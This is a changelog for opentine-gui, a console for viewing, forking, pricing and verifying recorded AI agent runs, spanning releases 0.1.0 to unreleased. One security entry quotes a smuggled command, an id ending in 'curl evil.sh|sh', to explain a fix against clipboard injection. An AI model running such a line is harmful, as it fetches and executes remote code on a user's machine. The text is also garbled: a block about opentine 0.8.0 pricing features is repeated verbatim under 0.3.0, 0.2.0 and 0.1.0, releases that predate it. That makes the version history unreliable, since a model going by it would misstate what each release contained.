# Changelog

All notable changes to opentine-gui are documented here.

## [Unreleased]

### Added

- **Verify offline** (`Run > Verify offline...`): opentine's own `tine verify --offline` report
  for the selected file - digest, signature, upgrade provenance, in-toto attestation, action
  manifest and optional action policy, RFC 3161 timestamps with optional TSA roots, and a
  `--strict` toggle. Built by opentine's report builder, so the console and the CLI cannot
  disagree. The signature row is the console's own verdict under its configured key rather than
  a second key loader; "Copy JSON" copies the `tine-verify-report/1` document.
- **Export as HTML page and ATIF JSON** (`Run` menu), beside the OpenTelemetry export. The page
  is opentine's own `tine view` rendering with a Content-Security-Policy that forbids scripts and
  remote loads; ATIF is opentine's v1.8 trajectory exporter. Both write atomically and ask before
  replacing a file.
- **Shortcuts:** Ctrl+T transcript, Ctrl+D compare, Ctrl+P price, Ctrl+V verify offline (Cmd on
  macOS), shown in the menus. F1 help now lists every menu.
- **Repositories are named by object format** ("repository, objects v4") instead of always "v3",
  read from a bounded `config.json`. The About text names the formats actually supported.

### Security

- The preferences file is not read when it is larger than 1 MiB.
- Transcript role, name and tool-call id are length-bounded in their headings.

### Changed

- Verify offline on a repository run explains how to verify it instead of being silently
  greyed out. Typing in the pricing date or verify inputs no longer triggers global shortcuts.

## [0.4.0] - 2026-11-04

Targets **opentine 0.34.0**, twenty-six releases on from 0.8.0. The release that matters is
0.26: every opentine writer now produces a TINEZ1-compressed `tine-artifact/4` bundle signed at
`tine-sig/3`. On the old floor the console could not open those files at all; on 0.34 with the
old code it read them, but its own trust and save-safety checks parsed the raw bytes as JSON and
silently fell back to "unknown".

**Requires `opentine >= 0.34.0`** (`< 0.35`).

### Added

- **Format v4 is understood.** The trust panel reads the `tine-sig/3` scheme off a v4 bundle and
  states what it covers (the root and the annotation head: steps, tags and metadata). The
  integrity caveat for v4 says what is actually true there: every object id is re-derived, tags
  and metadata included, and it is still unkeyed. The run inspector reports `Format: v4`
  (opentine's reader rebuilds a v2-shaped record, so `run.format_version` says 2) and an
  upgraded run's `upgraded_from` record as a claim.
- **Saves say when they convert a file.** Pause, resume and fork re-save through opentine, which
  writes v4. When the file on disk is v1/v2, the confirmation now says the save converts it and
  that opentine before 0.26 cannot open the result, including opentine 0.1's
  linear files, which carry no `format_version`.
- **Save-safety for v4.** "Would this save drop something?" is answered for v4 bundles by
  round-tripping them through the installed reader and writer and comparing roots, instead of
  diffing keys of a run dict a v4 file does not have. The full re-encode only runs when a payload holds a key the
  installed writer does not produce, and verdicts are cached per file revision, so a large run
  no longer stalls the UI for seconds before the dialog appears.
- **Newer recorder metadata is shown, labelled as claims:** capture method and source format
  (with a warning when the agent could have edited the log it was imported from), the claimed
  agent identity, edited forks (opentine 0.28/0.33) with the changed paths and a note that the
  edited step never ran, rewind originals (0.32), and recorder warnings.
- **RFC 3161 timestamp sidecars** (`RUN.tine.timestamps.json`, 0.31) are reported beside the run,
  explicitly as not verified here.
- **`provider:` and `harness:` filters**, matching the predicates opentine's query grammar gained,
  evaluated by the same rules as `tine ls`.
- Demo runs are regenerated as v4, plus `demo-legacy-v2` and `demo-edited-fork`;
  `scripts/verify_fixtures.py` reports the on-disk format and requires both v2 and v4 fixtures.

### Security

- **Copy id refuses an id with control characters.** Ids are artifact-controlled and opentine
  accepts any string; one like `x\ncurl evil.sh|sh` was shown flattened but copied raw, and ran
  its second line when pasted into a shell.
- Terminal escapes and other C0 controls are now stripped from every text widget, so "Copy
  text" / "Copy panel" cannot carry them to the clipboard.
- Exception text in the pricing and statistics panels is flattened, so it cannot open a row.
- Size and age formatting tolerate NaN, infinite and out-of-range values.
- **The 10 MiB file limit now bounds what is parsed, not just what is on disk.** A TINEZ1 file
  declares its inflated size, and a 3 MB file could expand to 150 MB and be parsed several times
  per selection. Such files are skipped unread ("expands to N bytes"), and every read the console
  makes itself inflates under the same bound.

### Changed

- Imported traces no longer carry a cost (opentine 0.10+ never trusts a file's own figure);
  price them with `Run > Price this run...`.

## [0.3.0] - 2026-08-24

Targets **opentine 0.8.0**, four releases on from the 0.4.0/0.5.0 this console was written
against. Two of those releases changed what a reader has to do to be honest about an artifact,
so this is a correctness release before it is a feature release: on the old floor the console
erased causal edges whenever it saved a run, reported valid signatures as errors, and printed
`$0.0000` for runs that had never been priced at all.

**Requires `opentine >= 0.8.0`** (`< 0.9`). Each release below that floor is missing a field
this console reads and writes back, and opentine's reader ignores keys it does not know: 0.7.1
added `causal_ids`, the edges a fork actually follows, and 0.8.0 added `provider`, half of the
`(provider, model, usage)` record that post-hoc pricing is a function of. 0.8.0 is also what
makes `tine price`, time-of-day rate cards and the unmetered local servers readable at all.

### Added

- **Causal edges are drawn.** A step's `causal_ids` (opentine 0.7.1) name the non-parent
  ancestors it required. opentine's fork keeps that closure, so a console that drew only
  parent links showed a strict subgraph and then forked something wider than it showed. They
  are now a distinct edge class in the DAG, counted in the graph summary, listed in the step
  inspector, and part of the layout.
- **Fork previews its slice.** The fork dialog states how many steps the new run will keep, and
  how many of them are reached through causal edges, using opentine's own `retained_closure`
  rather than a second ancestor walk that could disagree with it.
- **v3 repositories open, read-only.** Pointing the console at a repository used to be refused
  outright. It now lists every run in the object store, the refs that point at them, and the
  branch/tag/promotion groups (`View > Repository refs...`). Writing into a repository would
  append an object and move a branch, so pause, resume and fork stay disabled there and say
  why. Opening one writes nothing: the console attaches with `Repo(<.tine dir>)` rather than
  `Repo.open`, which heals the layout and would leave untracked directories behind.
- **Price this run.** `Run > Price this run...` recomputes a run's cost from its own record
  against opentine's signed catalog, as of a date you choose, and reports the catalog id and
  hash beside the figure. A step the catalog cannot answer for is `unknown`, never zero.
- **Import a trace.** `File > Import a trace...` turns an OTLP/JSON document, an opentine JSONL
  dump or a LangChain / LlamaIndex / AutoGen / CrewAI / OpenAI-Agents log into a `.tine`
  artifact. opentine's own import warnings are surfaced rather than swallowed.
- **Statistics.** `View > Statistics...` is a `tine stats`-shaped rollup over the loaded runs —
  counts, cost total/mean/max, distinct models, tag and format histograms — grouped by model,
  status, tag, day, format version or provider. A figure that was never collected renders `-`
  and never sums with a real one.
- **Signature keys can be configured.** `OPENTINE_GUI_HMAC_KEY` / `OPENTINE_GUI_PUBLIC_KEY` (or
  their preference-file equivalents) let the console actually verify a signature instead of
  always reporting "no key". Trust-on-first-use is supported and rendered differently from a
  real verification, because it is a different claim.
- **A transcript view** (`Run > Transcript...`) renders `Run.transcript`: the conversation
  opentine's runtime records alongside the graph, coloured by role, now including tool calls,
  tool results and separated reasoning, with every turn that produced a step linked to it.
- **The run filter understands opentine's query grammar.** `status:failed`, `model:opus`,
  `tag:bug`, `cost:>0.01`, `cost:0.01..1`, `after:2026-07-01` and `before:` combine with
  free-text terms, matching what `tine ls` and `tine search` accept. The grammar engages only
  when a field prefix is present, so a plain multi-word search keeps its substring behaviour.
  Parsed queries are evaluated against loaded runs rather than through `RunIndex`, whose
  `search()` writes an index file into the user's runs directory.
- **Export as OpenTelemetry GenAI** (`Run > Export as OpenTelemetry JSON`) writes the same
  OTLP/JSON document `tine export` writes, through opentine's own serializer, refusing to
  overwrite a previous export without confirmation and writing atomically.
- **A message log.** Action results and failures now land in a log that survives the next
  refresh, instead of a single status line the auto-refresh overwrote two seconds later.
- **More of the console is reachable from the keyboard**: `Ctrl+O` changes directory, `F1`
  opens help, and every shortcut works with `Cmd` on macOS, where they previously did nothing.
- Recent runs directories are remembered and offered in the directory picker.
- Releases publish to PyPI through GitHub Actions using **Trusted Publishing** (OIDC), so no
  API token is stored in the repository. A tag whose version disagrees with `pyproject.toml`
  fails the build rather than publishing the wrong version.

### Changed

- **Scanning moved off the render thread.** Reading a directory means parsing every artifact
  and hashing every file; doing that inside the frame loop stalled the console on every
  refresh tick. A worker thread produces snapshots and the render thread applies them.
- **Parsed runs are cached by file revision**, so an unchanged artifact is not re-parsed on
  every tick, and the selected run's graph is only rebuilt when that run's own bytes change —
  the DAG no longer loses your pan, zoom and node positions every two seconds while an agent
  writes to some other file in the directory.
- **The run list is a real table**: id, status, model, steps, cost and age, sortable by any
  column, with the selected row highlighted rather than prefixed.
- **`$0.0000` is no longer printed for a run that was never priced.** A run with model steps
  and no billing at all now reads `no cost recorded`, and the run list shows `-`. opentine's
  position is that an uncosted step is unknown, not free, and the console now shares it.
- **The trust panel states its own scope.** The integrity digest covers the artifact body and
  not `metadata`; a `tine-sig/1` signature covers eleven metadata keys and excludes `tags` and
  `fork_reason`. Both are now said out loud, beside the verdict they qualify.
- **Compare reports what opentine's diff cannot see.** `Run.diff` compares neither `provider`
  nor `causal_ids`, and `provider` is not part of a step id, so two runs differing only in who
  served the calls compared as identical. The console adds those deltas itself, labelled as
  its own extension rather than as opentine's verdict.
- Provider is shown wherever a model is: the run inspector, the step inspector, DAG nodes, and
  the search corpus.
- The filter box is debounced and preferences are flushed on a pause in typing, rather than
  writing to disk on every keystroke.
- `app.py` was split into modules — `text`, `desktop`, `theme`, `sources`, `graphmodel`,
  `query`, `inspectors`, `pricing`, `otelio`, `stats`, `trust` — leaving only Dear PyGui work
  in the app. The old names are re-exported.

### Added since the 0.7.2 draft of this release

- **Time-of-day pricing.** `opentine-pricing/2` rate cards carry peak/off-peak windows chosen
  by the instant a step ran. The console's own pricing pass billed without that instant, so a
  scheduled card priced at its base rate — for DeepSeek V4 the off-peak one, so a run inside
  the peak window reported half what it cost. It agrees with `tine price` on both sides of a
  window now, including on the path that recovers a provider from a pre-0.8.0 billing record.
- **Unmetered local servers.** opentine 0.8.0 made thirteen of them nameable, and they charge
  nothing per token. A run served by one reads `$0.0000 (unmetered)` rather than a bare zero;
  the pricing panel counts steps that were unmetered at capture apart from steps nothing could
  price, since no catalog carries a rate card for a local server.
- **Catalog provenance.** opentine requires a signature only on its own bundled catalog: an
  overlay in the working directory, the user config, or named by `$TINE_PRICING_CATALOG` is
  loaded unsigned and wins the lookup. The panel says which kind produced the figure, and a
  price that came from a provider recovered out of a billing record is marked, because
  `tine price` reads `Step.provider` only and will disagree.

### Fixed

- **An artifact could write a row of the console's own.** A run id of
  `"a\nIntegrity: ok"` printed that second line itself, directly above the real
  verdicts; the id was the one artifact field that reached the run inspector
  without being collapsed to a single line. Every id that reaches a panel, a
  dialog subject, a table cell, a tooltip or a picker row goes through the same
  flattening now, as does a node label before the comparison pane renders it.
  Invisible layout controls — the bidirectional overrides and isolates — are
  stripped too: reordering text prints one string as another without a newline
  anywhere in it.
- **A fork reason was labelled attested on the strength of a digest the same
  file wrote.** It now also requires opentine's fork-id check to agree, a fork
  record this build cannot read says so rather than silently printing nothing,
  and the block states that fork provenance is the artifact's own account.
- **A configured signing key that failed to load was echoed into a trust row**
  and copied to the clipboard with the rest of the inspector — the setting named
  "public key" being exactly where a private seed gets pasted, since opentine's
  keygen prints both as indistinguishable 64-hex strings. A value is named only
  once it has produced a key. The configuration fingerprint is salted per
  process, so a published one cannot confirm a guessed passphrase offline, and
  neither it nor the key survives a `repr`.
- **A step that recorded "I could not be priced" rendered as `$0.0000`,** because
  the console read the truthiness of the billing block rather than its status.
  A total that cannot be read at all — twelve steps claiming `"1e999999"`
  overflow opentine's billing context and `Run.total_cost` raises — used to take
  out the whole run table, healthy runs included; it now costs one cell.
- **Importing a named pipe froze the console permanently.** Opening a FIFO blocks
  until something writes to it, and imports run on the render thread. The file
  type is settled on the stat first.
- **`~someone` with no home directory stopped the console opening** — from
  `last_runs_dir`, a value the console writes into its own preferences and users
  sync between machines.
- **Statistics contradicted the run list.** A bucket in which nothing was priced
  reported `$0.0000` where the list said "no cost recorded", and grouping by
  model or provider added the run's whole cost to every key it named, so the
  rows summed to more than the run.
- **A step could state a cost the run total disagreed with**: the inspector read
  `Step.cost` while `Run.total_cost` prefers `billing["known_subtotal_usd"]`.
- **Non-ASCII payload text was unsearchable**, escaped to `\u00e9` in the search
  corpus, in a console whose search box is its main way in.
- **One legal artifact could freeze the frame loop.** A 10,000-step run cost
  2.3 s per refresh tick — longer than the refresh interval. The signature
  verdict and scheme moved to the loader thread, the per-run walks are memoised,
  both filters are debounced, and the table and graph are redrawn only when what
  they draw has changed. An idle tick is 37 ms.
- **A save could silently drop a field this opentine cannot read.** opentine adds
  step fields inside format v2 and its reader ignores keys it does not know, so
  a console running an older library loads a newer artifact, drops the field in
  memory, and destroys it on disk the moment it saves. Pause, resume and fork
  now name what would go and ask first.
- **Pause and Resume silently destroyed a signature.** `Run.save` rewrites `metadata.integrity`
  from scratch, dropping any signature block and any draft marker. Both actions now say what
  will be lost and ask, because the console cannot re-sign what it unsigned.
- **A missing runs directory is reported.** It used to return silently, so a typo'd path looked
  exactly like an empty directory.
- **The transcript window is a modal.** With it open, `Esc` cleared the filter behind it and the
  arrow keys moved the selection underneath it, after which `show step` reported that the step
  was not in the run — because the run had changed.
- `Ctrl+F` no longer focuses the search box behind an open dialog.
- Dragging an edge in the DAG says the graph is a recording instead of silently doing nothing.
- The verification cache evicts its oldest entries instead of clearing itself entirely, so a
  directory holding more revisions than the cap no longer re-hashes everything on every pass.
- The DAG and the run table are bounded, and say what they left out, rather than building an
  unbounded number of widgets in one frame for a very large run.

## [0.2.0] - 2026-07-31

Targets **opentine 0.4.0**. This release re-targets the console across three opentine
releases, adds first-class Windows and macOS support, and fixes several ways the console
could mislead you about a run — or lose one.

**Requires `opentine >= 0.4.0`**, and is tested against 0.5.0. Below 0.4.0, forking the
same step twice derives a single id and the second fork silently overwrites the first.
opentine 0.5.0 is additive — it changes nothing about what is written — so the console
reads 0.4.0 and 0.5.0 artifacts identically.

### Added

- **Compare two runs.** `Diff`, or `Run > Compare with...`, reports the common ancestor,
  the steps unique to each side, and per-field before/after deltas including cost, model
  and token usage. A forked run defaults to comparing against its origin.
- **Fork to a branch, with a reason.** The `Fork` button still forks onto `main` in one
  click; `Run > Fork to branch...` adds a branch name, an optional reason, and a
  reproducible-id option. In opentine 0.4.0 the branch and reason are part of the fork
  id, and the reason is recorded the same way opentine's own MCP fork records it.
- **Windows, macOS and Linux support.** Preferences live in each platform's own config
  directory (`%APPDATA%`, `~/Library/Application Support`, `~/.config`), with
  `XDG_CONFIG_HOME` honoured everywhere and the previous location still read on upgrade.
  Lint and the full suite run on all three systems in CI.
- **HiDPI displays.** The console detects the display scale — per-monitor DPI on Windows,
  `GDK_SCALE`/`QT_SCALE_FACTOR` then `Xft.dpi` on Linux — and scales the whole layout with
  it. `OPENTINE_GUI_SCALE` overrides.
- **Readable non-ASCII output.** Dear PyGui's built-in font is ASCII-only, so accented
  text, dashes, arrows and symbols in recorded agent output rendered as `?`. A system
  monospace font is now loaded per platform; `OPENTINE_GUI_FONT` selects another (set it
  to a CJK face for CJK text).
- **Keyboard navigation.** `Up`/`Down` move through the run list, `Esc` backs out of a
  dialog or filter, `Ctrl+F` focuses search, `Ctrl+C` copies the selected run id and
  `Ctrl+R` forces a reload. Keys stay inert while a text field has focus or a dialog is
  open.
- **More of each run is visible**: token totals, tags, refs and branches, format and
  migration provenance, integrity and signature state, system prompt, cost attribution by
  model and by step kind, budget versus incurred, and full fork lineage. Per step:
  timestamp, token usage and billing. `Copy id` copies the full id, which the table elides.
- Cost is marked `>=` when opentine reports its pricing as incomplete, so a partially
  priced run is never shown as an exact total.

### Changed

- Fork lineage now distinguishes sibling forks. Since 0.4.0 a fork id identifies the fork
  *act*, so two forks of one step share `forked_from` and `fork_point` while being
  different runs; the inspector reports the branch and whether the act was unique or
  reproducible. Pre-0.4.0 forks show just the origin line.
- Run search covers system prompt, tags and run metadata, and is cached per run so typing
  stays responsive on large directories.
- `demo/seed.py` seeds both fork shapes — a legacy lineage-only artifact and a genuine
  0.4.0 fork with a recorded, verifiable basis.

### Added since the 0.7.2 draft of this release

- **Time-of-day pricing.** `opentine-pricing/2` rate cards carry peak/off-peak windows chosen
  by the instant a step ran. The console's own pricing pass billed without that instant, so a
  scheduled card priced at its base rate — for DeepSeek V4 the off-peak one, so a run inside
  the peak window reported half what it cost. It agrees with `tine price` on both sides of a
  window now, including on the path that recovers a provider from a pre-0.8.0 billing record.
- **Unmetered local servers.** opentine 0.8.0 made thirteen of them nameable, and they charge
  nothing per token. A run served by one reads `$0.0000 (unmetered)` rather than a bare zero;
  the pricing panel counts steps that were unmetered at capture apart from steps nothing could
  price, since no catalog carries a rate card for a local server.
- **Catalog provenance.** opentine requires a signature only on its own bundled catalog: an
  overlay in the working directory, the user config, or named by `$TINE_PRICING_CATALOG` is
  loaded unsigned and wins the lookup. The panel says which kind produced the figure, and a
  price that came from a provider recovered out of a billing record is marked, because
  `tine price` reads `Step.provider` only and will disagree.

### Fixed

- **Forking could silently destroy an earlier fork.** A reproducible fork derives the same
  id every time, so a second one resolved to the same filename and overwrote the first,
  along with any work done inside it. Forking now refuses to overwrite an existing
  artifact, as opentine's own CLI and MCP fork do.
- **A fork reason was displayed as though it were attested.** opentine leaves
  `metadata.fork_reason` out of its signed metadata keys, and metadata sits outside the
  integrity digest, so the text can be rewritten on a signed, integrity-clean artifact —
  and it rendered directly beneath `Signature: verified`. The inspector now re-derives the
  signed fork-intent digest and labels anything that does not reproduce it as
  `Fork reason (unverified)`. `verify_fork_id` additionally flags a fork record edited
  after the fact.
- **An opentine v3 repository is refused rather than half-opened.** A repository's own
  `.tine/` directory matched the run glob, so pointing the console at a worktree showed
  one run out of many, a false integrity failure, and a `Pause` button that rewrote the
  repository's branch.
- **A budget-killed run says so**, reporting the breached dimension and the overage
  instead of a bare `failed`.
- **Crashes on third-party artifacts.** A null `model_info`, a lone UTF-16 surrogate in
  any displayed string, an out-of-range timestamp, or a deep step graph could terminate
  the console; a corrupt file now becomes one row in the error panel. Duplicate run ids
  are reported instead of producing an unselectable row.
- **Actions write back to the file the run was loaded from**, so a renamed or shared
  artifact is no longer duplicated. `Pause` and `Resume` reload from disk first, so a
  stale view cannot truncate steps a running agent has since written.
- **Rendering races.** Dear PyGui dispatches callbacks on a separate thread; selecting a
  run, typing in the graph filter or confirming a fork rebuilt hundreds of graph items
  mid-frame. Callbacks now run between frames. Switching runs also no longer crashes the
  node editor.
- Integrity and signature results are cached per file revision, keyed so that a tampered
  file which restores its timestamp is still caught.
- Preferences are written atomically, so a crash mid-write cannot truncate them.
- Run ids that are Windows device names (`CON`, `NUL`, `COM1`, ...) are refused as
  filenames on Windows, where they resolve to devices rather than files.
- Layout fixes: the status bar is visible, disabled actions look and behave disabled,
  graph nodes no longer overlap, the graph search actually highlights its matches, and
  panels scale with the window instead of clipping.

## [0.1.0] - 2026-06-25

First production-ready release. Audited and aligned against the released
open-source [opentine 0.1.1](https://pypi.org/project/opentine/) (`.tine`
`format_version == 1`).

### Added since the 0.7.2 draft of this release

- **Time-of-day pricing.** `opentine-pricing/2` rate cards carry peak/off-peak windows chosen
  by the instant a step ran. The console's own pricing pass billed without that instant, so a
  scheduled card priced at its base rate — for DeepSeek V4 the off-peak one, so a run inside
  the peak window reported half what it cost. It agrees with `tine price` on both sides of a
  window now, including on the path that recovers a provider from a pre-0.8.0 billing record.
- **Unmetered local servers.** opentine 0.8.0 made thirteen of them nameable, and they charge
  nothing per token. A run served by one reads `$0.0000 (unmetered)` rather than a bare zero;
  the pricing panel counts steps that were unmetered at capture apart from steps nothing could
  price, since no catalog carries a rate card for a local server.
- **Catalog provenance.** opentine requires a signature only on its own bundled catalog: an
  overlay in the working directory, the user config, or named by `$TINE_PRICING_CATALOG` is
  loaded unsigned and wins the lookup. The panel says which kind produced the figure, and a
  price that came from a provider recovered out of a billing record is marked, because
  `tine price` reads `Step.provider` only and will disagree.

### Fixed
- **Demo fixtures and seed script were written against a non-existent opentine
  API and an obsolete `.tine` layout.** Under released opentine, `Run.load()`
  rejected every bundled `.tine` file (`Unsupported .tine format_version=…`) and
  `demo/seed.py` crashed (`Step.__init__() got an unexpected keyword 'parent_id'`,
  `Run(steps=…)`). The seed now builds runs via the real `Run`/`Graph`/`Step`
  API and emits valid, integrity-checked `format_version == 1` artifacts;
  `.tine_runs/` fixtures were regenerated.
- **Test suite used the same invalid constructors** (`Step(parent_id=…)`,
  `Run(steps=…)`, mutating the read-only `Run.id`, appending to the read-only
  `Run.steps` view). Rewritten against the real API.

### Changed
- **DAG renders full ancestry.** Steps with multiple `parent_ids` (graph merges)
  now draw a link from every parent; depth and graph stats account for all
  parents instead of only the last one.
- **Step rendering matches opentine conventions.** Error steps surface
  `step.error` (type/message), tool steps surface `step.tool_info`, and `done`
  steps fall back to `inputs.text`. The step inspector shows dedicated Tool and
  Error sections.
- **Search covers tool names and error text** (`tool_info`/`error` added to run
  and step filter haystacks).
- Pinned `opentine >= 0.1.1`; refreshed `uv.lock`.

### Removed
- Dead `_on_run_click` handler (the run table uses button callbacks).
